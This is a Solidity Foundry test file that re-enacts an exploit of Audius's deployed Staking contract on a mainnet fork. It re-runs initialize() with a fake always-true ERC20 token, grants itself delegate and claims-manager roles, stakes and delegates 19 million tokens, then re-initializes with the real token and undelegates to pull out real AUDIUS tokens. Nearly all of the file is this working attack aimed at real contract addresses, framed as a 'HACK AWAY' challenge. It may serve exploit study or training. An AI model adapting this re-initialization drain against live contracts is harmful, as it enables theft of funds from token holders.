// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.5.0;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";

import "../src/Governance.sol";
import "../src/Staking.sol";
import "../src/DelegateManager.sol";
import "../src/Registry.sol";
import "../src/token/AudiusToken.sol";

contract ContractTest is DSTest {
    Governance gov;
    Staking st;
    DelegateManager dm;
    Registry reg;
    AudiusToken token;

    address constant private VM_ADDRESS = address(bytes20(uint160(uint256(keccak256('hevm cheat code')))));
    Vm public constant vm = Vm(VM_ADDRESS);

    function setUp() public {
        gov = Governance(0x4DEcA517D6817B6510798b7328F2314d3003AbAC);
        st = Staking(0xe6D97B2099F142513be7A2a068bE040656Ae4591);
        dm = DelegateManager(0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225);
        reg = Registry(0xd976d3b4f4e22a238c1A736b6612D22f17b6f64C);
        token = AudiusToken(0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998);
    }

    function testTofunmiHack() public {
        vm.createSelectFork("INSERT RPC URL HERE", 15201700);
        console.log("Audius Balance: ", token.balanceOf(address(this)));

        // HACK AWAY! (Don't forget you can use vm.roll(newBlock) to simulate multiple blocks)
        FakeERC20Token fk = new FakeERC20Token();
        st.initialize(address(fk), address(this));
        st.setDelegateManagerAddress(address(this));
        st.setClaimsManagerAddress(address(this));
        st.delegateStakeFor(address(this), address(this), 19_000_000 ether);
        st.stakeRewards(19_000_000 ether, address(this));
        st.initialize(address(token), address(this));
        st.undelegateStakeFor(address(this), address(this), 19_000_000 ether);

        console.log("Audius Balance: ", token.balanceOf(address(this)));
        require(token.balanceOf(address(this)) > 18_000_000 ether, "do better!");
    }

    function isGovernanceAddress() public returns (bool) {
        return true;
    }
}
contract FakeERC20Token {
    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        return true;
    }
}